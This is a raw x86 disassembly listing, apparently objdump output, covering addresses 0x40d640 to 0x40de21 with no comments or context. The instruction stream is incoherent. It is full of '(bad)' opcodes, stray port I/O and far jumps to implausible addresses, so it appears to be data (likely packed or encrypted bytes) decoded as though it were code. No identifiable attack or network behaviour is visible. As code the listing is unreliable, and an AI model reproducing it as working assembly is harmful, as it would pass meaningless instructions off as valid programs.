  40d640:	mov    esp,DWORD PTR [esi-0x1a]
  40d643:	test   al,0xbc
  40d645:	ret    
  40d646:	dec    ecx
  40d647:	xchg   dh,cl
  40d649:	dec    edi
  40d64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d64b:	jb     0x40d61e
  40d64d:	in     al,dx
  40d64e:	aad    0x2f
  40d650:	cmp    eax,0x2f3b8c19
  40d655:	mov    WORD PTR [ebp-0x75a50540],cx
  40d65c:	ficom  WORD PTR [ebx+0x22514b0c]
  40d662:	mov    esp,DWORD PTR [edx-0x554f101c]
  40d668:	imul   ebx,DWORD PTR [esi-0x79],0x57
  40d66c:	cmp    DWORD PTR [esi],ebx
  40d66e:	jecxz  0x40d640
  40d670:	repnz inc esp
  40d672:	xchg   esi,eax
  40d673:	frstor [edx]
  40d675:	popa   
  40d676:	adc    DWORD PTR [ecx],eax
  40d678:	mov    es,WORD PTR [ebx+0x5d87e5de]
  40d67e:	imul   esi,ecx,0x79
  40d681:	mov    al,0x6c
  40d683:	fdiv   QWORD PTR [edx]
  40d685:	and    BYTE PTR [eax],dh
  40d687:	daa    
  40d688:	shl    BYTE PTR ds:0x1591d8be,cl
  40d68e:	add    DWORD PTR [edx],esp
  40d690:	inc    esp
  40d691:	push   esi
  40d692:	cli    
  40d693:	pop    esi
  40d694:	ficom  WORD PTR [edi-0x48]
  40d697:	mov    ds:0x465191e8,al
  40d69c:	fs out dx,eax
  40d69e:	jns    0x40d709
  40d6a0:	jns    0x40d684
  40d6a2:	cli    
  40d6a3:	xchg   edi,eax
  40d6a4:	add    eax,0xb2c1dc75
  40d6a9:	mov    bl,0x27
  40d6ab:	and    eax,DWORD PTR [eax+edi*8+0x44]
  40d6af:	cmp    al,0x9
  40d6b1:	pop    ebp
  40d6b2:	aam    0xc3
  40d6b4:	cld    
  40d6b5:	retf   
  40d6b6:	jnp    0x40d668
  40d6b8:	add    eax,0xe07fb5b9
  40d6bd:	fadd   QWORD PTR [ebx+ecx*8+0x6e18a2ec]
  40d6c4:	cmp    BYTE PTR [edi-0x60],dh
  40d6c7:	aas    
  40d6c8:	not    DWORD PTR [edx+eax*2-0x78aa43f8]
  40d6cf:	xchg   edi,eax
  40d6d0:	xchg   edi,eax
  40d6d1:	push   es
  40d6d2:	psadbw mm5,QWORD PTR [ebp-0x492b9979]
  40d6d9:	in     eax,dx
  40d6da:	js     0x40d70a
  40d6dc:	push   cs
  40d6dd:	cdq    
  40d6de:	push   ebx
  40d6df:	xor    eax,0xc850db86
  40d6e4:	cmp    DWORD PTR [edi],edi
  40d6e6:	lds    ebp,FWORD PTR [esi-0x7039b485]
  40d6ec:	lds    ecx,FWORD PTR [ecx-0x33b18b7b]
  40d6f2:	push   eax
  40d6f3:	(bad)  
  40d6f4:	jecxz  0x40d6be
  40d6f6:	inc    ecx
  40d6f7:	sbb    BYTE PTR [ecx-0x78],dh
  40d6fa:	xor    ebx,DWORD PTR [esi-0x2d43860d]
  40d700:	adc    eax,0xce0a9a61
  40d705:	bound  ebp,QWORD PTR [ebx]
  40d707:	fucom  st(2)
  40d709:	js     0x40d759
  40d70b:	pushf  
  40d70c:	sahf   
  40d70d:	mov    al,ds:0x43f26c65
  40d712:	mov    esi,DWORD PTR [ebx-0x53]
  40d715:	inc    esi
  40d716:	mov    esi,0xca0e6855
  40d71b:	retf   
  40d71c:	add    al,0xac
  40d71e:	jp     0x40d737
  40d720:	je     0x40d773
  40d722:	outs   dx,DWORD PTR ds:[esi]
  40d723:	sbb    eax,0x8de99906
  40d728:	test   eax,0xfb0847ed
  40d72d:	js     0x40d79a
  40d72f:	aam    0x2a
  40d731:	fwait
  40d732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d733:	leave  
  40d734:	in     eax,dx
  40d735:	nop
  40d736:	fs push ecx
  40d738:	cwde   
  40d739:	fs (bad) 
  40d73c:	mov    edx,0xae9700a3
  40d741:	mov    WORD PTR [ebp-0x73996740],?
  40d747:	ret    0xf270
  40d74a:	pop    ebx
  40d74b:	mov    ebx,0xf9e92e30
  40d750:	ins    DWORD PTR es:[edi],dx
  40d751:	pop    ds
  40d752:	push   ebp
  40d753:	lods   al,BYTE PTR ds:[esi]
  40d754:	xor    BYTE PTR [ecx-0x71],al
  40d757:	mov    dh,0x2b
  40d759:	outs   dx,DWORD PTR ds:[esi]
  40d75a:	pop    esp
  40d75b:	(bad)  
  40d75c:	icebp  
  40d75d:	ds push es
  40d75f:	cmp    DWORD PTR [ebx+0xb],ecx
  40d762:	pop    ss
  40d763:	scas   eax,DWORD PTR es:[edi]
  40d764:	mov    ah,0xdc
  40d766:	inc    edi
  40d767:	pop    es
  40d768:	sub    DWORD PTR gs:[edi-0x2691cf97],esp
  40d76f:	fnstcw WORD PTR [eax+0x65]
  40d772:	fstp   QWORD PTR ds:0x42ee1aaf
  40d778:	push   ds
  40d779:	cs jg  0x40d70e
  40d77c:	xchg   edx,eax
  40d77d:	and    ch,BYTE PTR [edx+0x6b053f95]
  40d783:	bnd call ebx
  40d786:	pop    ds
  40d787:	out    0xe8,al
  40d789:	cdq    
  40d78a:	clc    
  40d78b:	mov    al,0xf2
  40d78d:	imul   BYTE PTR ds:0x2288e0ba
  40d793:	add    bl,bh
  40d795:	aam    0x50
  40d797:	or     DWORD PTR [esi+0x4d],eax
  40d79a:	dec    edi
  40d79b:	add    DWORD PTR [ebp+0x14],eax
  40d79e:	mov    ah,0x4
  40d7a0:	push   0xf
  40d7a2:	fldcw  WORD PTR [edx+0xa]
  40d7a5:	xor    esp,DWORD PTR ds:0x164d97fb
  40d7ab:	add    eax,0x88806417
  40d7b0:	mov    esi,0xa92cbd37
  40d7b5:	fiadd  WORD PTR [eax-0x157bae27]
  40d7bb:	xor    al,0x5c
  40d7bd:	sar    BYTE PTR [edx-0x7e],0xa6
  40d7c1:	xor    BYTE PTR [ebx],dl
  40d7c3:	xlat   BYTE PTR ds:[ebx]
  40d7c4:	cmp    esp,esp
  40d7c6:	adc    al,0x65
  40d7c8:	push   cs
  40d7c9:	xchg   esp,eax
  40d7ca:	mov    ch,0x14
  40d7cc:	mov    ch,0x49
  40d7ce:	jmp    0x180cb49e
  40d7d3:	sub    al,0x46
  40d7d5:	hlt    
  40d7d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7d7:	cs retf 0xe369
  40d7db:	test   al,0x79
  40d7dd:	sub    ah,BYTE PTR [ebx-0x68ce82ac]
  40d7e3:	inc    edi
  40d7e4:	xlat   BYTE PTR ds:[ebx]
  40d7e5:	fistp  DWORD PTR [ebp+eax*8-0x61]
  40d7e9:	mov    bl,0xf
  40d7eb:	xchg   esp,eax
  40d7ec:	out    dx,eax
  40d7ed:	das    
  40d7ee:	and    al,0x19
  40d7f0:	jb     0x40d775
  40d7f2:	mov    dl,0x7d
  40d7f4:	imul   ebx,DWORD PTR [eax+eiz*2-0xefd310],0xc6bbbaf7
  40d7ff:	icebp  
  40d800:	popf   
  40d801:	adc    eax,0x1a74182f
  40d806:	enter  0xbb23,0x29
  40d80a:	ss add al,0x25
  40d80d:	aam    0xf
  40d80f:	cmp    ecx,DWORD PTR [edx*4+0x2664723d]
  40d816:	in     al,0x18
  40d818:	popf   
  40d819:	mov    cl,0xa8
  40d81b:	in     eax,dx
  40d81c:	pop    ebp
  40d81d:	xor    bh,BYTE PTR [edi-0x66015e93]
  40d823:	adc    bl,BYTE PTR [eax-0x262e28d6]
  40d829:	out    0xd4,eax
  40d82b:	nop
  40d82c:	inc    ecx
  40d82d:	cwde   
  40d82e:	mov    BYTE PTR [esi+0x9de0941],ah
  40d834:	out    0x2e,al
  40d836:	call   0x3067:0x97b78ba7
  40d83d:	sbb    ebp,DWORD PTR [ecx+0x46]
  40d840:	repnz push es
  40d842:	sbb    DWORD PTR [eax],esp
  40d844:	xor    al,0x77
  40d846:	jo     0x40d85a
  40d848:	inc    ecx
  40d849:	ret    0xc7a7
  40d84c:	sub    bh,0xbf
  40d84f:	cmp    al,0xa1
  40d851:	jmp    0x40d8b1
  40d853:	mov    bh,0xfc
  40d855:	xchg   edi,eax
  40d856:	sbb    BYTE PTR [edi],0x3b
  40d859:	xor    al,0x19
  40d85b:	push   ebp
  40d85c:	lods   al,BYTE PTR ds:[esi]
  40d85d:	rcr    ebx,0x84
  40d860:	iret   
  40d861:	sahf   
  40d862:	adc    ah,ah
  40d864:	rol    bh,cl
  40d866:	or     esi,DWORD PTR [eax+edi*8+0x10]
  40d86a:	sbb    eax,0xbd1fcfb8
  40d86f:	push   ss
  40d870:	retf   
  40d871:	mov    edx,0x1abb10f7
  40d876:	lahf   
  40d877:	mov    edx,0xe576fa12
  40d87c:	mov    ecx,0x39d3235f
  40d881:	test   eax,0xf9f7d662
  40d886:	dec    edi
  40d887:	adc    ch,BYTE PTR [ecx-0x7a1c0140]
  40d88d:	inc    edx
  40d88e:	cmp    bh,BYTE PTR [ebx-0x4a]
  40d891:	shl    BYTE PTR ds:0x94f4b6c,1
  40d897:	and    BYTE PTR [edi+esi*4-0x10057343],ch
  40d89e:	cld    
  40d89f:	mov    eax,0xdb53190
  40d8a4:	cmp    BYTE PTR ds:0x4202e4a,ch
  40d8aa:	ds sbb al,BYTE PTR ds:[edx-0x4d9d0c80]
  40d8b2:	outs   dx,BYTE PTR ds:[esi]
  40d8b3:	fadd   st(0),st
  40d8b5:	sbb    eax,0x8e72afd1
  40d8ba:	or     al,0x6f
  40d8bc:	or     dh,bl
  40d8be:	scas   al,BYTE PTR es:[edi]
  40d8bf:	cmp    BYTE PTR [edi-0x7c],bl
  40d8c2:	repz mov al,0xd2
  40d8c5:	repnz (bad) 
  40d8c8:	int    0x2b
  40d8ca:	mov    al,BYTE PTR [esi-0x7ae9c96d]
  40d8d0:	mov    BYTE PTR [ebx],al
  40d8d2:	lahf   
  40d8d3:	out    0x79,al
  40d8d5:	adc    ch,BYTE PTR [ecx]
  40d8d7:	out    0x9d,al
  40d8d9:	outs   dx,BYTE PTR ds:[esi]
  40d8da:	shl    BYTE PTR [edi-0x586056e8],cl
  40d8e0:	mov    ecx,0x54045a6e
  40d8e5:	push   cs
  40d8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8e7:	mov    dl,bh
  40d8e9:	sti    
  40d8ea:	retf   0x90fd
  40d8ed:	jae    0x40d93f
  40d8ef:	jnp    0x40d8be
  40d8f1:	into   
  40d8f2:	and    al,0xd5
  40d8f4:	jmp    0xe835:0xf1d7054f
  40d8fb:	pusha  
  40d8fc:	lods   eax,DWORD PTR ds:[esi]
  40d8fd:	cdq    
  40d8fe:	addr16 mov edx,0xb560f4dd
  40d904:	(bad)
  40d908:	stos   BYTE PTR es:[edi],al
  40d909:	test   al,0x2c
  40d90b:	pop    ds
  40d90c:	inc    ecx
  40d90d:	push   es
  40d90e:	cli    
  40d90f:	mov    ds:0x37f39660,al
  40d914:	call   0xf78cfb88
  40d919:	retf   0x1b18
  40d91c:	cld    
  40d91d:	cmp    dh,ch
  40d91f:	fidiv  DWORD PTR [esi-0x6d]
  40d922:	or     al,0x4d
  40d924:	rcr    DWORD PTR [eax],0x4c
  40d927:	sbb    DWORD PTR [ebx],ebp
  40d929:	fnstenv [eax+0x15]
  40d92c:	and    DWORD PTR [edx-0x3b316aae],esp
  40d932:	std    
  40d933:	xchg   edi,eax
  40d934:	and    ebp,eax
  40d936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d937:	inc    esi
  40d938:	in     al,dx
  40d939:	lods   al,BYTE PTR ds:[esi]
  40d93a:	pop    es
  40d93b:	xchg   esi,ebp
  40d93d:	mov    BYTE PTR [eax],dh
  40d93f:	adc    edx,DWORD PTR [eax]
  40d941:	test   BYTE PTR [eax+0x3192262],bh
  40d947:	pop    ds
  40d948:	enter  0xf98b,0xb8
  40d94c:	cmp    edi,DWORD PTR [eax-0x66d65558]
  40d952:	mov    edi,0x21117e1e
  40d957:	das    
  40d958:	dec    esi
  40d959:	int3   
  40d95a:	shl    BYTE PTR [ecx-0x59cc6a15],cl
  40d960:	jg     0x40d9c8
  40d962:	pop    edi
  40d963:	stos   DWORD PTR es:[edi],eax
  40d964:	xchg   esp,eax
  40d965:	rcr    DWORD PTR [ecx],0xd
  40d968:	push   ss
  40d969:	lea    edx,[esi]
  40d96b:	retf   
  40d96c:	adc    eax,0x8db9c494
  40d971:	aaa    
  40d972:	scas   al,BYTE PTR es:[edi]
  40d973:	push   esp
  40d974:	adc    DWORD PTR [eax],ecx
  40d976:	into   
  40d977:	jp     0x40d947
  40d979:	mov    esp,0x9f613cc5
  40d97e:	neg    edi
  40d980:	pusha  
  40d981:	pop    esi
  40d982:	sbb    bh,0x91
  40d985:	in     al,0xad
  40d987:	mov    eax,0xa72dfe49
  40d98c:	sbb    BYTE PTR [eax+0x561e295],ah
  40d992:	leave  
  40d993:	sub    DWORD PTR [ebx+esi*8+0x12],ecx
  40d997:	shr    ch,1
  40d999:	rcl    DWORD PTR [edi-0x3e],1
  40d99c:	or     ch,BYTE PTR [edx+0x36]
  40d99f:	sub    BYTE PTR [ecx+0x1f],ch
  40d9a2:	xor    eax,ecx
  40d9a4:	bound  ecx,QWORD PTR [edx+0x49]
  40d9a7:	jo     0x40d9d8
  40d9a9:	dec    esp
  40d9aa:	mov    esi,0x4f70ae17
  40d9af:	mov    dh,0xf4
  40d9b1:	nop
  40d9b2:	es mov al,0x27
  40d9b5:	(bad)  
  40d9b6:	jmp    0x40d9d8
  40d9b8:	mov    bl,0xa7
  40d9ba:	cmc    
  40d9bb:	jge    0x40d995
  40d9bd:	xchg   ecx,eax
  40d9be:	lods   eax,DWORD PTR ds:[esi]
  40d9bf:	shl    DWORD PTR [edx],cl
  40d9c1:	xchg   edi,eax
  40d9c2:	add    edi,eax
  40d9c4:	sbb    cl,bl
  40d9c6:	stc    
  40d9c7:	rcl    DWORD PTR [esi],0xd6
  40d9ca:	sub    al,0x8e
  40d9cc:	and    eax,0x3ccd3078
  40d9d1:	(bad)  
  40d9d2:	xchg   edx,eax
  40d9d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9d4:	jo     0x40d997
  40d9d6:	inc    esi
  40d9d7:	aad    0xa9
  40d9d9:	(bad)  
  40d9da:	pusha  
  40d9db:	jno    0x40d9ba
  40d9dd:	xor    al,0x8e
  40d9df:	lea    ebx,[ebp+0x3f921280]
  40d9e5:	mov    esi,DWORD PTR [edi]
  40d9e7:	add    ecx,DWORD PTR [eax-0x1c783698]
  40d9ed:	and    ebx,DWORD PTR [esi-0x2a]
  40d9f0:	rcr    DWORD PTR [edx-0x66],1
  40d9f3:	out    0x21,al
  40d9f5:	add    DWORD PTR [ebp+ebx*4-0x63],edx
  40d9f9:	les    edx,FWORD PTR [esi+0x57]
  40d9fc:	pop    esi
  40d9fd:	mul    ebp
  40d9ff:	xlat   BYTE PTR ds:[ebx]
  40da00:	in     al,0xa1
  40da02:	push   es
  40da03:	mov    edi,0xc9cc1dd5
  40da08:	mov    edx,0x33d45b07
  40da0d:	rep outs dx,BYTE PTR ds:[esi]
  40da0f:	or     DWORD PTR [ebx-0x31c82df8],0x71c5a118
  40da19:	pop    edx
  40da1a:	add    esi,DWORD PTR [ecx-0x27]
  40da1d:	xchg   ecx,eax
  40da1e:	inc    eax
  40da1f:	and    al,0xf
  40da21:	jns    0x40da3d
  40da23:	or     BYTE PTR [eax],bh
  40da25:	hlt    
  40da26:	stos   BYTE PTR es:[edi],al
  40da27:	xor    dh,ah
  40da29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da2a:	aaa    
  40da2b:	sbb    edi,ecx
  40da2d:	or     ecx,DWORD PTR [ecx-0x333f15c2]
  40da33:	mov    ah,0x37
  40da35:	mov    dh,0x37
  40da37:	add    ah,ch
  40da39:	add    al,0x6c
  40da3b:	jmp    0xdf1974ea
  40da40:	mov    esp,0x1a17329a
  40da45:	jle    0x40dab5
  40da47:	xchg   BYTE PTR [eax+0xf],ah
  40da4a:	imul   esi,DWORD PTR [edx],0xffffffc9
  40da4d:	push   0x31
  40da4f:	addr16 iret 
  40da51:	xor    BYTE PTR [ebx+0x451b286e],dh
  40da57:	push   edi
  40da58:	sbb    ah,BYTE PTR [esi-0x64]
  40da5b:	cwde   
  40da5c:	cdq    
  40da5d:	fistp  WORD PTR [edx]
  40da5f:	sbb    al,0xcf
  40da61:	cmp    DWORD PTR ds:0xe10688a5,esp
  40da67:	(bad)  
  40da68:	aad    0x77
  40da6a:	aam    0x4
  40da6c:	pop    edi
  40da6d:	mov    dl,0x46
  40da6f:	out    dx,eax
  40da70:	ss mov ebp,0xeca4a568
  40da76:	adc    esp,edi
  40da78:	cmc    
  40da79:	iret   
  40da7a:	mov    esp,0xfb72bb65
  40da7f:	and    eax,0xb9a671ea
  40da84:	not    ecx
  40da86:	sar    DWORD PTR [esi-0x3e],0x3d
  40da8a:	fsubr  st,st(0)
  40da8c:	test   al,0x2a
  40da8e:	mov    edi,0xe18f5dd8
  40da93:	int    0x7e
  40da95:	imul   ebx,DWORD PTR [ebx+0x72e0af7b],0x702a9fce
  40da9f:	es xchg dl,dh
  40daa2:	xchg   esp,eax
  40daa3:	xchg   ecx,eax
  40daa4:	(bad)  
  40daa5:	pop    ds
  40daa6:	adc    dl,BYTE PTR [eax+0x28]
  40daa9:	lods   al,BYTE PTR ds:[esi]
  40daaa:	add    al,0xae
  40daac:	or     ebp,DWORD PTR [ecx+0x44]
  40daaf:	jmp    0x40db28
  40dab1:	jecxz  0x40daa1
  40dab3:	sub    ch,BYTE PTR [esp+ebx*4-0x8]
  40dab7:	pop    edx
  40dab8:	in     al,dx
  40dab9:	mov    cl,0x2b
  40dabb:	(bad)  [ebx-0x71]
  40dabe:	cld    
  40dabf:	inc    eax
  40dac0:	(bad)  
  40dac2:	arpl   WORD PTR [ebp+0xd43799e],ax
  40dac8:	dec    ebx
  40dac9:	retf   
  40daca:	or     BYTE PTR [ecx-0x7d],cl
  40dacd:	jge    0x40daaf
  40dacf:	inc    ebx
  40dad0:	xor    BYTE PTR [esi-0x4134b0e9],al
  40dad6:	int    0xb8
  40dad8:	outs   dx,WORD PTR ds:[esi]
  40dada:	pop    eax
  40dadb:	mov    bl,0x63
  40dadd:	sbb    BYTE PTR [edx+0x32a75037],ah
  40dae3:	jp     0x40da7b
  40dae5:	xor    DWORD PTR [eax+0x783d36b2],eax
  40daeb:	enter  0xf825,0x7e
  40daef:	ss sbb eax,0x7f5b97c2
  40daf5:	mov    eax,0x296cd63c
  40dafa:	aaa    
  40dafb:	mov    eax,ds:0xc2f2e8f5
  40db00:	or     bh,BYTE PTR [edi+0x4d33008a]
  40db06:	add    BYTE PTR [eax],ch
  40db08:	lds    edx,FWORD PTR [edi-0x42586ea]
  40db0e:	dec    eax
  40db0f:	(bad)  
  40db10:	dec    edx
  40db11:	pushf  
  40db12:	and    dh,BYTE PTR gs:[ebx+0x19]
  40db16:	call   0x64e1:0xbb8b41ad
  40db1d:	jnp    0x40daca
  40db1f:	fs in  al,0x5a
  40db22:	cmp    al,0x7b
  40db24:	inc    ecx
  40db25:	fcom   DWORD PTR [ecx-0x6dbcb261]
  40db2b:	cmp    ebx,DWORD PTR [esi-0x3d]
  40db2e:	adc    eax,DWORD PTR [eax-0x3e]
  40db31:	scas   eax,DWORD PTR es:[edi]
  40db32:	ret    0xd0c1
  40db35:	mov    cs,WORD PTR [ebp+0x4d]
  40db38:	daa    
  40db39:	(bad)  
  40db3a:	(bad)  
  40db3b:	pop    esi
  40db3c:	loopne 0x40db15
  40db3e:	fs ret 0xdb47
  40db42:	in     al,dx
  40db43:	mov    DWORD PTR [ebx+0x63],esp
  40db46:	or     DWORD PTR [ebx-0x72dbb3b3],eax
  40db4c:	mov    ebx,0x71da05fa
  40db51:	and    dl,dh
  40db53:	cli    
  40db54:	stos   DWORD PTR es:[edi],eax
  40db55:	and    BYTE PTR [esi+0x8],al
  40db58:	jno    0x40db84
  40db5a:	jbe    0x40db3c
  40db5c:	mov    al,ds:0xa6e0cf3e
  40db61:	pop    ebx
  40db62:	sbb    al,0x82
  40db64:	enter  0x163c,0xa6
  40db68:	out    0x96,al
  40db6a:	retf   
  40db6b:	push   cs
  40db6c:	pop    eax
  40db6d:	test   al,0x37
  40db6f:	out    dx,al
  40db70:	jo     0x40db8c
  40db72:	mov    ?,WORD PTR [edx]
  40db74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db75:	popa   
  40db76:	xor    DWORD PTR [edx],edi
  40db78:	and    bh,BYTE PTR [ebp+0x36bb8b8a]
  40db7e:	popf   
  40db7f:	cmp    BYTE PTR [ebx+0x7ed87fc9],dh
  40db85:	xor    DWORD PTR [edx+edi*1-0x67],ebp
  40db89:	retf   0x5703
  40db8c:	ins    DWORD PTR es:[edi],dx
  40db8d:	xchg   ebp,eax
  40db8e:	pop    edi
  40db8f:	mov    ecx,0x11e5ff8c
  40db94:	inc    esi
  40db95:	mov    esp,DWORD PTR [ecx-0x7c]
  40db98:	mov    ebp,0x8ab667a2
  40db9d:	sbb    al,ch
  40db9f:	arpl   WORD PTR [esi+0x7d425866],sp
  40dba5:	(bad)  
  40dba6:	dec    ecx
  40dba7:	aaa    
  40dba8:	not    BYTE PTR [ebx+0x54]
  40dbab:	push   ds
  40dbac:	cmp    al,BYTE PTR [si]
  40dbaf:	cmp    cl,BYTE PTR [edx-0x29]
  40dbb2:	ja     0x40dbdf
  40dbb4:	shr    BYTE PTR [esi],1
  40dbb6:	mov    al,ds:0x24a54402
  40dbbb:	dec    ebp
  40dbbc:	pop    esi
  40dbbd:	jbe    0x40dbd6
  40dbbf:	aam    0x58
  40dbc1:	aaa    
  40dbc2:	adc    BYTE PTR [ebp+edi*4+0x67],ch
  40dbc6:	xor    al,0xc5
  40dbc8:	jnp    0x40db8f
  40dbca:	div    bl
  40dbcc:	fucomp st(6)
  40dbce:	lea    ebp,[edi-0x5]
  40dbd1:	push   eax
  40dbd2:	jnp    0x40dbb8
  40dbd4:	(bad)  
  40dbd5:	mov    dl,bl
  40dbd7:	and    al,dh
  40dbd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbda:	stos   BYTE PTR es:[edi],al
  40dbdb:	inc    edi
  40dbdc:	mov    BYTE PTR [ebx+0x30],dh
  40dbdf:	arpl   WORD PTR [eax-0x12],bx
  40dbe2:	mov    bl,0xb0
  40dbe4:	fsub   DWORD PTR [edi]
  40dbe6:	iret   
  40dbe7:	mov    eax,0x6d357cf0
  40dbec:	mov    bh,0xd5
  40dbee:	fs in  eax,dx
  40dbf0:	pop    ds
  40dbf1:	cdq    
  40dbf2:	jecxz  0x40dbda
  40dbf4:	pop    esi
  40dbf5:	push   ebp
  40dbf6:	pop    ecx
  40dbf7:	arpl   bp,di
  40dbf9:	outs   dx,DWORD PTR ds:[esi]
  40dbfa:	xor    BYTE PTR [ecx],dh
  40dbfc:	jp     0x40dbc2
  40dbfe:	retf   
  40dbff:	fst    DWORD PTR ds:0x7138be8e
  40dc05:	ja     0x40dbb4
  40dc07:	or     bh,bl
  40dc09:	xchg   ecx,eax
  40dc0a:	mov    cl,0xcc
  40dc0c:	aas    
  40dc0d:	scas   eax,DWORD PTR es:[edi]
  40dc0e:	sub    BYTE PTR [ebp+ebp*1-0x7f4e6b94],al
  40dc15:	scas   al,BYTE PTR es:[edi]
  40dc16:	xchg   DWORD PTR [ebx-0x4bce1d20],eax
  40dc1c:	push   cs
  40dc1d:	out    dx,eax
  40dc1e:	inc    ebx
  40dc1f:	cwde   
  40dc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc21:	ins    BYTE PTR es:[edi],dx
  40dc22:	fcom   st(3)
  40dc24:	test   al,0x69
  40dc26:	jecxz  0x40dc67
  40dc28:	inc    edi
  40dc29:	adc    eax,0x5e68ac2c
  40dc2e:	je     0x40dc6d
  40dc30:	add    edx,edx
  40dc32:	pop    eax
  40dc33:	call   0x176b9356
  40dc38:	jne    0x40dc1f
  40dc3a:	daa    
  40dc3b:	mov    al,0xa
  40dc3d:	adc    edx,ecx
  40dc3f:	imul   eax,DWORD PTR [ebx],0x61
  40dc42:	xchg   ebp,eax
  40dc43:	pop    esi
  40dc44:	popf   
  40dc45:	push   edi
  40dc46:	adc    cl,BYTE PTR [edi]
  40dc48:	shr    DWORD PTR [edi+0x17],1
  40dc4b:	inc    eax
  40dc4c:	ss ss xchg ecx,eax
  40dc4f:	push   0x1d
  40dc51:	fs pop ecx
  40dc53:	or     ebx,DWORD PTR [edi]
  40dc55:	int3   
  40dc56:	loope  0x40dbf7
  40dc58:	cmc    
  40dc59:	sbb    BYTE PTR [edi+0x2],bh
  40dc5c:	clc    
  40dc5d:	js     0x40dc42
  40dc5f:	inc    eax
  40dc60:	push   ss
  40dc61:	xlat   BYTE PTR ds:[ebx]
  40dc62:	lahf   
  40dc63:	sbb    esp,eax
  40dc65:	or     eax,0x28e32d08
  40dc6a:	push   ecx
  40dc6b:	js     0x40dcc3
  40dc6d:	push   0x40
  40dc6f:	out    0x11,al
  40dc71:	dec    esp
  40dc72:	xchg   eax,ebp
  40dc74:	xchg   edi,eax
  40dc75:	mov    bh,0x76
  40dc77:	retf   
  40dc78:	jno    0x40dcda
  40dc7a:	out    0xca,al
  40dc7c:	daa    
  40dc7d:	jno    0x40dc16
  40dc7f:	clc    
  40dc80:	mov    BYTE PTR [eax],ah
  40dc82:	imul   ebp,esp,0xb94b919e
  40dc88:	jmp    0x885d:0xdb2f0489
  40dc8f:	and    eax,0x7a63a26c
  40dc94:	mov    cx,0x4669
	...
  40dd14:	int3   
  40dd15:	(bad)
  40dd1a:	into   
  40dd1b:	imul   DWORD PTR [ecx+0x715c4e4c]
  40dd21:	pusha  
  40dd22:	ror    BYTE PTR [bx+di-0x75],cl
  40dd26:	add    BYTE PTR [eax],al
  40dd28:	ins    BYTE PTR es:[edi],dx
  40dd29:	pop    es
  40dd2a:	add    BYTE PTR [eax],al
  40dd2c:	addr16 ja 0x40dcd1
  40dd2f:	dec    eax
  40dd30:	sub    DWORD PTR [ecx],edi
  40dd32:	iret   
  40dd33:	test   DWORD PTR [ebx+ebx*2],ebp
  40dd36:	fisubr DWORD PTR [ebp+eax*2-0x1a6b4809]
  40dd3d:	inc    ebx
  40dd3e:	xchg   edi,eax
  40dd3f:	jns    0x40dce5
  40dd41:	jmp    0x87d79cd4
  40dd46:	imul   edi,DWORD PTR [ebp+ecx*2-0x59],0xfffffffe
  40dd4b:	ret    0x1932
  40dd4e:	adc    esi,edx
  40dd50:	mov    ecx,0x2d1e9ea7
  40dd55:	pop    es
  40dd56:	adc    BYTE PTR [edi+0x5c],dl
  40dd59:	lahf   
  40dd5a:	(bad)  
  40dd5c:	sbb    eax,0xc7671d05
  40dd61:	nop
  40dd62:	jae    0x40ddb8
  40dd64:	imul   esi,DWORD PTR [esi],0x5fb2f92c
  40dd6a:	out    0xc,al
  40dd6c:	rcl    ah,1
  40dd6e:	adc    BYTE PTR [ecx-0x30],dl
  40dd71:	gs hlt 
  40dd73:	adc    eax,0xe27de04d
  40dd78:	imul   edx,DWORD PTR [ecx],0x1def22ae
  40dd7e:	push   ss
  40dd7f:	jne    0x40ddb2
  40dd81:	adc    eax,0xfd0f75f2
  40dd86:	dec    edx
  40dd87:	test   al,0x93
  40dd89:	lea    ebx,[ebp+0x17]
  40dd8c:	pop    eax
  40dd8d:	sbb    eax,0x2c427f0d
  40dd92:	inc    ebx
  40dd93:	das    
  40dd94:	or     BYTE PTR [eax-0xb],ch
  40dd97:	mov    WORD PTR [di+0x38],gs
  40dd9b:	push   0x73c0eb67
  40dda0:	push   ebx
  40dda1:	fistp  WORD PTR [ecx+0x152d8e06]
  40dda7:	mov    dl,0xf9
  40dda9:	out    0xe4,eax
  40ddab:	loop   0x40dd84
  40ddad:	rol    DWORD PTR [esi+0x22],cl
  40ddb0:	fild   DWORD PTR [esp+0x63]
  40ddb4:	jae    0x40ddfd
  40ddb6:	scas   eax,DWORD PTR es:[edi]
  40ddb7:	xchg   edx,eax
  40ddb8:	xor    esp,esp
  40ddba:	fmul   QWORD PTR [ebp-0x66]
  40ddbd:	pop    ecx
  40ddbe:	dec    edi
  40ddbf:	cmp    al,0xbb
  40ddc1:	leave  
  40ddc2:	xor    BYTE PTR [esi-0xe19d6aa],0x5e
  40ddc9:	out    dx,al
  40ddca:	jp     0x40dd93
  40ddcc:	mov    dl,bl
  40ddce:	dec    edx
  40ddcf:	mov    eax,0xa8dc2dbe
  40ddd4:	adc    bh,bl
  40ddd6:	cdq    
  40ddd7:	div    DWORD PTR [ebx-0xbe76b24]
  40dddd:	js     0x40ddea
  40dddf:	call   0xa5b9806e
  40dde4:	ins    BYTE PTR es:[edi],dx
  40dde5:	mov    dl,0xa3
  40dde7:	jle    0x40de5a
  40dde9:	cmp    al,0x7e
  40ddeb:	xchg   ebx,eax
  40ddec:	shl    DWORD PTR [edx+0x179d002f],1
  40ddf2:	hlt    
  40ddf3:	cmp    DWORD PTR [edx-0x11],esp
  40ddf6:	cli    
  40ddf7:	sub    bl,bl
  40ddf9:	int3   
  40ddfa:	or     ebp,DWORD PTR [esi+0x22]
  40ddfd:	xchg   ecx,eax
  40ddfe:	mov    ch,0x4b
  40de00:	sbb    eax,DWORD PTR [ecx+0x2d99ac3a]
  40de06:	adc    al,0x10
  40de08:	jbe    0x40ddd1
  40de0a:	mov    eax,ds:0xf2fc45f7
  40de0f:	or     eax,0xf2a9e73b
  40de14:	xor    eax,0xcf59091f
  40de19:	jnp    0x40de03
  40de1b:	add    esi,DWORD PTR [edi-0x6853874d]
  40de21:	(bad)  
